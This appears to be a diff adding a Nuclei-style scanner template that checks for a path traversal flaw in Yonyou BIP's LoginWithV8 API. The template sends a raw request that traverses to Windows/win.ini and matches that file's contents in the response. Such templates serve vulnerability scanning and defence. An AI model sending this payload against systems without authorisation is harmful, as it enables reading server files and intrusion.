@@ -1,0 +1,23 @@
+id: yonyou-Bip-LoginWithV8-PathTraversal
+info:
+  name: yonyou-Bip-LoginWithV8-PathTraversal
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        GET /bi/api/Portal/LoginWithV8/?ticket=/../../../../Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: keep-alive
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - support[fonts]
+          - extensions
+    matchers-condition: and
